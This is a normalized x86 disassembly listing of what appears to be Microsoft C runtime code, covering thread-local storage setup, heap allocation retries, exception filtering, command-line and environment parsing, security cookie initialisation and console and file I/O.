mov ebx [ GetProcAddress@IAT ]
call ebx
mov [ esi + 0x1f8 ] eax
push r--data
push [ ebp - 0x1c ]
call ebx
mov [ esi + 0x1fc ] eax
push [ esi + 0x6c ]
call sub_40c1a6
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40a692
call sub_405299
retn
mov eax [ rw-data ]
mov [ esi + 0x6c ] eax
sub_40a69b
mov edi edi
push esi
push edi
call [ GetLastError@IAT ]
push [ rw-data ]
mov edi eax
call sub_40a543
call eax
mov esi eax
test esi esi
jne r-xdata
push edi
call [ SetLastError@IAT ]
pop edi
mov eax esi
pop esi
retn
push 0x214
push 0x1
call sub_40aa2f
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
push esi
push [ rw-data ]
push [ rw-data ]
call sub_40a4c8
pop ecx
call eax
test eax eax
je r-xdata
push esi
call sub_404db5
pop ecx
xor esi esi
push 0x0
push esi
call sub_40a5b4
pop ecx
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi ] eax
jmp r-xdata
sub_40a72e
push 0x8
push r--data
call sub_405254
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_405299
retn 0x4
mov eax [ esi + 0x24 ]
test eax eax
je r-xdata
mov eax [ esi + 0x2c ]
test eax eax
je r-xdata
push eax
call sub_404db5
pop ecx
mov eax [ esi + 0x34 ]
test eax eax
je r-xdata
push eax
call sub_404db5
pop ecx
mov eax [ esi + 0x3c ]
test eax eax
je r-xdata
push eax
call sub_404db5
pop ecx
mov eax [ esi + 0x40 ]
test eax eax
je r-xdata
push eax
call sub_404db5
pop ecx
mov eax [ esi + 0x44 ]
test eax eax
je r-xdata
push eax
call sub_404db5
pop ecx
mov eax [ esi + 0x48 ]
test eax eax
je r-xdata
push eax
call sub_404db5
pop ecx
mov eax [ esi + 0x5c ]
cmp eax r--data
je r-xdata
push eax
call sub_404db5
pop ecx
push 0xd
call sub_40917b
pop ecx
and [ ebp - 0x4 ] 0x0
mov edi [ esi + 0x68 ]
test edi edi
je r-xdata
push eax
call sub_404db5
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40a848
push 0xc
call sub_40917b
pop ecx
mov [ ebp - 0x4 ] 0x1
mov edi [ esi + 0x6c ]
test edi edi
je r-xdata
push edi
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40a854
push esi
call sub_404db5
pop ecx
push edi
call sub_40c235
pop ecx
cmp edi [ rw-data ]
je r-xdata
cmp edi rw-data
je r-xdata
cmp edi rw-data
je r-xdata
push edi
call sub_404db5
pop ecx
cmp [ edi ] 0x0
jne r-xdata
push edi
call sub_40c05d
pop ecx
sub_40a85d
mov edi edi
push esi
push edi
mov esi r--data
push esi
call [ GetModuleHandleW@IAT ]
test eax eax
jne r-xdata
mov edi eax
test edi edi
je r-xdata
push esi
call sub_409ca9
pop ecx
call sub_40a577
mov esi [ GetProcAddress@IAT ]
push r--data
push edi
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
cmp [ rw-data ] 0x0
mov esi [ TlsSetValue@IAT ]
mov [ rw-data ] eax
je r-xdata
mov eax [ TlsGetValue@IAT ]
mov [ rw-data ] eax
mov eax [ TlsFree@IAT ]
mov [ rw-data ] sub_40a53a
mov [ rw-data ] esi
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
push [ rw-data ]
push eax
call esi
test eax eax
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
call sub_409f93
push [ rw-data ]
call sub_40a44d
push [ rw-data ]
mov [ rw-data ] eax
call sub_40a44d
push [ rw-data ]
mov [ rw-data ] eax
call sub_40a44d
push [ rw-data ]
mov [ rw-data ] eax
call sub_40a44d
add esp 0x10
mov [ rw-data ] eax
call sub_408fff
test eax eax
je r-xdata
test eax eax
jne r-xdata
push sub_40a72e
push [ rw-data ]
call sub_40a4c8
pop ecx
call eax
mov [ rw-data ] eax
cmp eax 0xffffffff
je r-xdata
call [ TlsAlloc@IAT ]
mov [ rw-data ] eax
cmp eax 0xffffffff
je r-xdata
push 0x214
push 0x1
call sub_40aa2f
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
push esi
push [ rw-data ]
push [ rw-data ]
call sub_40a4c8
pop ecx
call eax
test eax eax
je r-xdata
push 0x0
push esi
call sub_40a5b4
pop ecx
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi ] eax
xor eax eax
inc eax
jmp r-xdata
pop edi
pop esi
retn
sub_40a9ea
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push [ ebp + 0x8 ]
call sub_4050ad
mov edi eax
pop ecx
test edi edi
jne r-xdata
sub_40aa2f
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40dd08
mov edi eax
add esp 0xc
test edi edi
jne r-xdata
sub_40aa7b
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ ebp + 0xc ] eax
je r-xdata
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_404e43
mov edi eax
pop ecx
pop ecx
test edi edi
jne r-xdata
sub_40aac9
push 0x10
push r--data
call sub_405254
xor eax eax
mov ebx [ ebp + 0x8 ]
xor edi edi
cmp ebx edi
setne al
cmp eax edi
jne r-xdata
cmp [ rw-data ] 0x3
jne r-xdata
call sub_405ca6
mov [ eax ] 0x16
push edi
push edi
push edi
push edi
push edi
call sub_405c3e
add esp 0x14
or eax 0xffffffff
jmp r-xdata
push ebx
push edi
push [ rw-data ]
call [ HeapSize@IAT ]
mov esi eax
push 0x4
call sub_40917b
pop ecx
mov [ ebp - 0x4 ] edi
push ebx
call sub_4091ae
pop ecx
mov [ ebp - 0x20 ] eax
cmp eax edi
je r-xdata
call sub_405299
retn
mov esi [ ebp - 0x1c ]
mov esi [ ebx - 0x4 ]
sub esi 0x9
mov [ ebp - 0x1c ] esi
jmp r-xdata
mov eax esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40ab63
cmp [ ebp - 0x20 ] edi
jne r-xdata
sub_40ab6c
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp [ eax ] 0xe06d7363
jne r-xdata
xor eax eax
pop ebp
retn 0x4
cmp [ eax + 0x10 ] 0x3
jne r-xdata
mov eax [ eax + 0x14 ]
cmp eax 0x19930520
je r-xdata
call sub_40d645
cmp eax 0x19930521
je r-xdata
cmp eax 0x19930522
je r-xdata
cmp eax 0x1994000
jne r-xdata
sub_40abbc
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push esi
call sub_40a69b
mov esi eax
test esi esi
je r-xdata
pop esi
leave
retn
mov edx [ esi + 0x5c ]
mov eax [ rw-data ]
push edi
mov edi [ ebp + 0x8 ]
mov ecx edx
push ebx
imul eax eax 0xc
add eax edx
cmp ecx eax
jae r-xdata
mov ebx eax
imul ebx ebx 0xc
add ecx 0xc
add ebx edx
cmp ecx ebx
jb r-xdata
xor eax eax
cmp [ ecx ] edi
jne r-xdata
cmp [ ecx ] edi
je r-xdata
xor eax eax
jmp r-xdata
mov ebx [ eax + 0x8 ]
mov [ ebp - 0x4 ] ebx
test ebx ebx
jne r-xdata
mov eax ecx
jmp r-xdata
pop ebx
pop edi
cmp ebx 0x5
jne r-xdata
test eax eax
je r-xdata
cmp ebx 0x1
je r-xdata
and [ eax + 0x8 ] 0x0
xor eax eax
inc eax
jmp r-xdata
or eax 0xffffffff
mov ecx [ esi + 0x60 ]
mov [ ebp - 0x8 ] ecx
mov ecx [ ebp + 0xc ]
mov [ esi + 0x60 ] ecx
mov ecx [ eax + 0x4 ]
cmp ecx 0x8
jne r-xdata
and [ eax + 0x8 ] 0x0
push ecx
call ebx
mov ecx [ rw-data ]
mov edi [ rw-data ]
mov edx ecx
add edi ecx
cmp edx edi
jge r-xdata
mov eax [ eax ]
mov edi [ esi + 0x64 ]
cmp eax 0xc000008e
jne r-xdata
imul ecx ecx 0xc
cmp eax 0xc0000090
jne r-xdata
mov [ esi + 0x64 ] 0x83
jmp r-xdata
mov edi [ esi + 0x5c ]
and [ ecx + edi + 0x8 ] 0x0
mov edi [ rw-data ]
mov ebx [ rw-data ]
inc edx
add ebx edi
add ecx 0xc
cmp edx ebx
jl r-xdata
mov ebx [ ebp - 0x4 ]
cmp eax 0xc0000091
jne r-xdata
mov [ esi + 0x64 ] 0x81
jmp r-xdata
push [ esi + 0x64 ]
push 0x8
call ebx
pop ecx
mov [ esi + 0x64 ] edi
jmp r-xdata
cmp eax 0xc0000093
jne r-xdata
mov [ esi + 0x64 ] 0x84
jmp r-xdata
mov eax [ ebp - 0x8 ]
pop ecx
mov [ esi + 0x60 ] eax
cmp eax 0xc000008d
jne r-xdata
mov [ esi + 0x64 ] 0x85
jmp r-xdata
cmp eax 0xc000008f
jne r-xdata
mov [ esi + 0x64 ] 0x82
jmp r-xdata
cmp eax 0xc0000092
jne r-xdata
mov [ esi + 0x64 ] 0x86
jmp r-xdata
mov [ esi + 0x64 ] 0x8a
sub_40ad1c
mov edi edi
push esi
push edi
xor edi edi
cmp [ rw-data ] edi
jne r-xdata
mov esi [ rw-data ]
test esi esi
jne r-xdata
call sub_40c03f
mov al [ esi ]
cmp al 0x20
ja r-xdata
mov esi r--data
cmp al 0x22
jne r-xdata
test al al
je r-xdata
movzx eax al
push eax
call sub_40de79
pop ecx
test eax eax
je r-xdata
xor ecx ecx
test edi edi
sete cl
mov edi ecx
pop edi
mov eax esi
pop esi
retn
test edi edi
je r-xdata
inc esi
jmp r-xdata
inc esi
mov al [ esi ]
test al al
jne r-xdata
cmp al 0x20
ja r-xdata
inc esi
sub_40ad7b
cmp [ rw-data ] 0x0
jne r-xdata
push esi
mov esi [ rw-data ]
push edi
xor edi edi
test esi esi
jne r-xdata
call sub_40c03f
mov al [ esi ]
test al al
jne r-xdata
or eax 0xffffffff
jmp r-xdata
cmp al 0x3d
je r-xdata
push 0x4
inc edi
push edi
call sub_40aa2f
mov edi eax
pop ecx
pop ecx
mov [ rw-data ] edi
test edi edi
je r-xdata
pop edi
pop esi
retn
push esi
call sub_405460
pop ecx
lea esi [ esi + eax + 0x1 ]
inc edi
mov esi [ rw-data ]
push ebx
jmp r-xdata
cmp [ esi ] 0x0
jne r-xdata
push esi
call sub_405460
mov ebx eax
inc ebx
cmp [ esi ] 0x3d
pop ecx
je r-xdata
push [ rw-data ]
call sub_404db5
and [ rw-data ] 0x0
and [ edi ] 0x0
mov [ rw-data ] 0x1
xor eax eax
add esi ebx
push 0x1
push ebx
call sub_40aa2f
pop ecx
pop ecx
mov [ edi ] eax
test eax eax
je r-xdata
push [ rw-data ]
call sub_404db5
and [ rw-data ] 0x0
or eax 0xffffffff
jmp r-xdata
push esi
push ebx
push eax
call sub_40db51
add esp 0xc
test eax eax
je r-xdata
pop ecx
pop ebx
add edi 0x4
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_405b16
add esp 0x14
sub_40ae59
mov edi edi
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0x10 ]
push ebx
xor eax eax
push esi
mov [ edi ] eax
mov esi edx
mov edx [ ebp + 0xc ]
mov [ ecx ] 0x1
cmp [ ebp + 0x8 ] eax
je r-xdata
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
add [ ebp + 0x8 ] 0x4
mov [ ebx ] edx
inc [ edi ]
test edx edx
je r-xdata
xor eax eax
cmp [ ebp - 0x4 ] eax
mov bl 0x22
sete al
inc esi
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov bl [ esi ]
movzx eax bl
push eax
inc esi
call sub_40de79
pop ecx
test eax eax
je r-xdata
mov al [ esi ]
mov [ edx ] al
inc edx
mov [ ebp + 0xc ] edx
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
test bl bl
je r-xdata
inc [ edi ]
cmp [ ebp + 0xc ] 0x0
je r-xdata
cmp [ esi ] 0x22
jne r-xdata
cmp bl 0x20
je r-xdata
dec esi
jmp r-xdata
inc esi
mov ecx [ ebp + 0xc ]
mov al [ esi ]
inc [ ebp + 0xc ]
mov [ ecx ] al
test edx edx
je r-xdata
cmp bl 0x9
jne r-xdata
and [ ebp - 0x4 ] 0x0
mov [ edx - 0x1 ] 0x0
mov eax [ ebp + 0x8 ]
pop esi
pop ebx
test eax eax
je r-xdata
mov al [ esi ]
cmp al 0x20
je r-xdata
inc [ ecx ]
leave
retn
and [ eax ] 0x0
inc esi
jmp r-xdata
cmp al 0x9
jne r-xdata
cmp [ esi ] 0x0
je r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
inc [ ecx ]
mov eax [ ebp + 0x8 ]
add [ ebp + 0x8 ] 0x4
mov [ eax ] edx
cmp [ esi ] 0x5c
je r-xdata
inc esi
inc ecx
cmp [ esi ] 0x22
jne r-xdata
test ecx ecx
je r-xdata
test cl 0x1
jne r-xdata
mov al [ esi ]
test al al
je r-xdata
dec ecx
test edx edx
je r-xdata
shr ecx 0x1
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test edx edx
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
inc [ edi ]
test ecx ecx
jne r-xdata
mov [ edx ] 0x5c
inc edx
xor eax eax
xor ebx ebx
cmp [ ebp - 0x4 ] eax
sete al
mov [ ebp - 0x4 ] eax
lea eax [ esi + 0x1 ]
cmp [ eax ] 0x22
jne r-xdata
inc [ edi ]
mov ecx [ ebp + 0x10 ]
jmp r-xdata
mov [ edx ] 0x0
inc edx
mov [ ebp + 0xc ] edx
test ebx ebx
je r-xdata
cmp al 0x20
je r-xdata
mov [ ebp + 0xc ] edx
mov esi eax
jmp r-xdata
cmp [ esi ] 0x0
je r-xdata
inc esi
jmp r-xdata
movsx eax al
push eax
test edx edx
je r-xdata
cmp al 0x9
je r-xdata
xor ebx ebx
inc ebx
xor ecx ecx
jmp r-xdata
call sub_40de79
pop ecx
test eax eax
je r-xdata
call sub_40de79
pop ecx
test eax eax
je r-xdata
inc [ edi ]
mov edx [ ebp + 0xc ]
inc esi
inc [ edi ]
mov ecx [ ebp + 0xc ]
mov al [ esi ]
inc [ ebp + 0xc ]
mov [ ecx ] al
jmp r-xdata
mov al [ esi ]
mov ecx [ ebp + 0xc ]
inc [ ebp + 0xc ]
mov [ ecx ] al
inc esi
inc [ edi ]
sub_40aff3
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push ebx
xor ebx ebx
push esi
push edi
cmp [ rw-data ] ebx
jne r-xdata
push 0x104
mov esi rw-data
push esi
push ebx
mov [ rw-data ] bl
call [ GetModuleFileNameA@IAT ]
mov eax [ rw-data ]
mov [ rw-data ] esi
cmp eax ebx
je r-xdata
call sub_40c03f
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x4 ] eax
cmp [ eax ] bl
jne r-xdata
or eax 0xffffffff
mov ecx [ ebp - 0xc ]
cmp ecx 0xffffffff
jae r-xdata
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x8 ]
push eax
push ebx
push ebx
lea edi [ ebp - 0xc ]
call sub_40ae59
mov eax [ ebp - 0x8 ]
add esp 0xc
cmp eax 0x3fffffff
jae r-xdata
mov edi eax
shl edi 0x2
lea eax [ edi + ecx ]
cmp eax ecx
jb r-xdata
push eax
call sub_40a9ea
mov esi eax
pop ecx
cmp esi ebx
je r-xdata
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x8 ]
push eax
add edi esi
push edi
push esi
lea edi [ ebp - 0xc ]
call sub_40ae59
mov eax [ ebp - 0x8 ]
add esp 0xc
dec eax
mov [ rw-data ] eax
mov [ rw-data ] esi
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub_40b0ae
mov edi edi
push ebp
mov ebp esp
mov eax [ rw-data ]
sub esp 0xc
push ebx
push esi
mov esi [ GetEnvironmentStringsW@IAT ]
push edi
xor ebx ebx
xor edi edi
cmp eax ebx
jne r-xdata
cmp eax 0x1
jne r-xdata
call esi
mov edi eax
cmp edi ebx
je r-xdata
cmp eax 0x2
je r-xdata
cmp edi ebx
jne r-xdata
call [ GetLastError@IAT ]
cmp eax 0x78
jne r-xdata
mov [ rw-data ] 0x1
jmp r-xdata
call [ GetEnvironmentStrings@IAT ]
mov esi eax
cmp esi ebx
je r-xdata
cmp eax ebx
jne r-xdata
mov eax edi
cmp [ edi ] bx
je r-xdata
call esi
mov edi eax
cmp edi ebx
jne r-xdata
mov eax [ rw-data ]
push 0x2
pop eax
mov [ rw-data ] eax
jmp r-xdata
xor eax eax
jmp r-xdata
cmp [ esi ] bl
je r-xdata
mov esi [ WideCharToMultiByte@IAT ]
push ebx
push ebx
push ebx
sub eax edi
push ebx
sar eax 0x1
inc eax
push eax
push edi
push ebx
push ebx
mov [ ebp - 0xc ] eax
call esi
mov [ ebp - 0x8 ] eax
cmp eax ebx
je r-xdata
inc eax
inc eax
cmp [ eax ] bx
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub eax esi
inc eax
push eax
mov [ ebp - 0x8 ] eax
call sub_40a9ea
mov edi eax
pop ecx
cmp edi ebx
jne r-xdata
inc eax
cmp [ eax ] bl
jne r-xdata
push edi
call [ FreeEnvironmentStringsW@IAT ]
mov eax ebx
jmp r-xdata
push eax
call sub_40a9ea
pop ecx
mov [ ebp - 0x4 ] eax
cmp eax ebx
je r-xdata
inc eax
inc eax
cmp [ eax ] bx
jne r-xdata
push [ ebp - 0x8 ]
push esi
push edi
call sub_404a50
add esp 0xc
push esi
call [ FreeEnvironmentStringsA@IAT ]
mov eax edi
push esi
call [ FreeEnvironmentStringsA@IAT ]
jmp r-xdata
inc eax
cmp [ eax ] bl
jne r-xdata
push ebx
push ebx
push [ ebp - 0x8 ]
push eax
push [ ebp - 0xc ]
push edi
push ebx
push ebx
call esi
test eax eax
jne r-xdata
mov ebx [ ebp - 0x4 ]
push [ ebp - 0x4 ]
call sub_404db5
pop ecx
mov [ ebp - 0x4 ] ebx
sub_40b1e5
mov edi edi
push esi
mov eax r--data
mov esi r--data
push edi
mov edi eax
cmp eax esi
jae r-xdata
pop edi
pop esi
retn
mov eax [ edi ]
test eax eax
je r-xdata
add edi 0x4
cmp edi esi
jb r-xdata
call eax
sub_40b20b
mov edi edi
push esi
mov eax r--data
mov esi r--data
push edi
mov edi eax
cmp eax esi
jae r-xdata
pop edi
pop esi
retn
mov eax [ edi ]
test eax eax
je r-xdata
add edi 0x4
cmp edi esi
jb r-xdata
call eax
sub_40b231
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
push ebx
push edi
mov edi 0xbb40e64e
mov ebx 0xffff0000
cmp eax edi
je r-xdata
push esi
lea eax [ ebp - 0x8 ]
push eax
call [ GetSystemTimeAsFileTime@IAT ]
mov esi [ ebp - 0x4 ]
xor esi [ ebp - 0x8 ]
call [ GetCurrentProcessId@IAT ]
xor esi eax
call [ GetCurrentThreadId@IAT ]
xor esi eax
call [ GetTickCount@IAT ]
xor esi eax
lea eax [ ebp - 0x10 ]
push eax
call [ QueryPerformanceCounter@IAT ]
mov eax [ ebp - 0xc ]
xor eax [ ebp - 0x10 ]
xor esi eax
cmp esi edi
jne r-xdata
test ebx eax
je r-xdata
test ebx esi
jne r-xdata
mov esi 0xbb40e64f
jmp r-xdata
not eax
mov [ rw-data ] eax
jmp r-xdata
mov [ rw-data ] esi
not esi
mov [ rw-data ] esi
pop esi
mov eax esi
shl eax 0x10
or esi eax
pop edi
pop ebx
leave
retn
sub_40b2c7
push 0x10
push r--data
call sub_405254
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
xor ebx ebx
cmp eax ebx
jl r-xdata
call sub_405ca6
mov [ eax ] 0x9
call sub_405ca6
mov [ eax ] 0x9
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_405c3e
add esp 0x14
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
call sub_405299
retn
or eax 0xffffffff
jmp r-xdata
mov ecx eax
sar ecx 0x5
lea edi [ ecx * 4 + rw-data ]
mov esi eax
and esi 0x1f
shl esi 0x6
mov ecx [ edi ]
movsx ecx [ esi + ecx + 0x4 ]
and ecx 0x1
je r-xdata
push eax
call sub_406995
pop ecx
mov [ ebp - 0x4 ] ebx
mov eax [ edi ]
test [ esi + eax + 0x4 ] 0x1
je r-xdata
call sub_405ca6
mov [ eax ] 0x9
or [ ebp - 0x1c ] 0xffffffff
push [ ebp + 0x8 ]
call sub_40691e
pop ecx
push eax
call [ FlushFileBuffers@IAT ]
test eax eax
jne r-xdata
mov [ ebp - 0x1c ] ebx
call [ GetLastError@IAT ]
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40b39e
mov eax [ ebp - 0x1c ]
call sub_405cb9
mov ecx [ ebp - 0x1c ]
mov [ eax ] ecx
cmp [ ebp - 0x1c ] ebx
je r-xdata
sub_40b3b0
push 0x10
push r--data
call sub_405254
xor ebx ebx
mov [ ebp - 0x1c ] ebx
push 0x1
call sub_40917b
pop ecx
mov [ ebp - 0x4 ] ebx
push 0x3
pop edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40b446
mov eax [ ebp - 0x1c ]
call sub_405299
retn
mov esi edi
shl esi 0x2
mov eax [ rw-data ]
add eax esi
cmp [ eax ] ebx
je r-xdata
inc edi
jmp r-xdata
mov eax [ eax ]
test [ eax + 0xc ] 0x83
je r-xdata
mov [ ebp - 0x20 ] edi
cmp edi [ rw-data ]
jge r-xdata
cmp edi 0x14
jl r-xdata
push eax
call sub_4042b0
pop ecx
cmp eax 0xffffffff
je r-xdata
mov eax [ rw-data ]
mov eax [ esi + eax ]
add eax 0x20
push eax
call [ DeleteCriticalSection@IAT ]
mov eax [ rw-data ]
push [ esi + eax ]
call sub_404db5
pop ecx
mov eax [ rw-data ]
mov [ esi + eax ] ebx
inc [ ebp - 0x1c ]
sub_40b44f
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x10 ]
push edi
push esi
mov [ ebp - 0x4 ] eax
call sub_40691e
or edi 0xffffffff
pop ecx
cmp eax edi
jne r-xdata
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x4 ]
push ecx
push [ ebp - 0x8 ]
push eax
call [ SetFilePointer@IAT ]
mov [ ebp - 0x8 ] eax
cmp eax edi
jne r-xdata
call sub_405ca6
mov [ eax ] 0x9
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
lea eax [ eax + esi + 0x4 ]
and [ eax ] 0xfd
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call [ GetLastError@IAT ]
test eax eax
je r-xdata
pop edi
pop esi
leave
retn
push eax
call sub_405ccc
pop ecx
jmp r-xdata
mov eax edi
mov edx edi
jmp r-xdata
sub_40b4d4
push 0x14
push r--data
call sub_405254
or esi 0xffffffff
mov [ ebp - 0x24 ] esi
mov [ ebp - 0x20 ] esi
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
xor edi edi
cmp eax edi
jl r-xdata
call sub_405cb9
and [ eax ] 0x0
call sub_405ca6
mov [ eax ] 0x9
call sub_405cb9
mov [ eax ] edi
call sub_405ca6
mov [ eax ] 0x9
push edi
push edi
push edi
push edi
push edi
call sub_405c3e
add esp 0x14
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
call sub_405299
retn
mov eax esi
mov edx esi
jmp r-xdata
mov ecx eax
sar ecx 0x5
lea ebx [ ecx * 4 + rw-data ]
mov esi eax
and esi 0x1f
shl esi 0x6
mov ecx [ ebx ]
movsx ecx [ ecx + esi + 0x4 ]
and ecx 0x1
jne r-xdata
push eax
call sub_406995
pop ecx
mov [ ebp - 0x4 ] edi
mov eax [ ebx ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_405cb9
mov [ eax ] edi
call sub_405ca6
mov [ eax ] 0x9
push edi
push edi
push edi
push edi
push edi
call sub_405c3e
add esp 0x14
or edx 0xffffffff
mov eax edx
jmp r-xdata
call sub_405ca6
mov [ eax ] 0x9
call sub_405cb9
mov [ eax ] edi
or [ ebp - 0x24 ] 0xffffffff
or [ ebp - 0x20 ] 0xffffffff
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40b44f
add esp 0x10
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x20 ] edx
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40b5e3
mov eax [ ebp - 0x24 ]
mov edx [ ebp - 0x20 ]
sub_40b5ed
mov edi edi
push ebp
mov ebp esp
inc [ rw-data ]
push 0x1000
call sub_40a9ea
pop ecx
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x8 ] eax
test eax eax
je r-xdata
or [ ecx + 0xc ] 0x4
lea eax [ ecx + 0x14 ]
mov [ ecx + 0x8 ] eax
mov [ ecx + 0x18 ] 0x2
or [ ecx + 0xc ] 0x8
mov [ ecx + 0x18 ] 0x1000
jmp r-xdata
mov eax [ ecx + 0x8 ]
and [ ecx + 0x4 ] 0x0
mov [ ecx ] eax
pop ebp
retn
sub_40b636
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
push esi
xor esi esi
cmp eax esi
jl r-xdata
call sub_405ca6
mov [ eax ] 0x9
xor eax eax
pop ebp
retn
call sub_405ca6
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x9
call sub_405c3e
add esp 0x14
xor eax eax
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
pop esi
pop ebp
retn
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
shl eax 0x6
movsx eax [ ecx + eax + 0x4 ]
and eax 0x40
sub_40b69a
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
xor esi esi
cmp [ rw-data ] esi
je r-xdata
push esi
push esi
push 0x5
lea eax [ ebp - 0xc ]
push eax
push 0x1
lea eax [ ebp + 0x8 ]
push eax
push esi
call [ GetConsoleOutputCP@IAT ]
push eax
call [ WideCharToMultiByte@IAT ]
mov ecx [ rw-data ]
cmp ecx 0xffffffff
je r-xdata
cmp [ rw-data ] 0xfffffffe
jne r-xdata
mov eax 0xffff
jmp r-xdata
push esi
lea edx [ ebp - 0x10 ]
push edx
push eax
lea eax [ ebp - 0xc ]
push eax
push ecx
call [ WriteConsoleA@IAT ]
test eax eax
je r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
jne r-xdata
call sub_40de91
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_4045c5
leave
retn
mov ax [ ebp + 0x8 ]
push esi
lea ecx [ ebp - 0x10 ]
push ecx
push 0x1
lea ecx [ ebp + 0x8 ]
push ecx
push eax
call [ WriteConsoleW@IAT ]
test eax eax
jne r-xdata
mov [ rw-data ] 0x1
jmp r-xdata
cmp [ rw-data ] 0x2
jne r-xdata
call [ GetLastError@IAT ]
cmp eax 0x78
jne r-xdata
mov [ rw-data ] esi
sub_40b75f
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi [ ebp + 0xc ]
xor ebx ebx
cmp esi ebx
je r-xdata
xor eax eax
cmp [ ebp + 0x10 ] ebx
je r-xdata
cmp [ esi ] bl
jne r-xdata
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_407138
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
movzx eax [ esi ]
push eax
call sub_40b890
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
xor ecx ecx
mov [ eax ] cx
xor eax eax
cmp [ ebp + 0x8 ] ebx
setne al
push eax
push [ ebp + 0x8 ]
mov eax [ ebp - 0x10 ]
push 0x1
push esi
push 0x9
push [ eax + 0x4 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
jne r-xdata
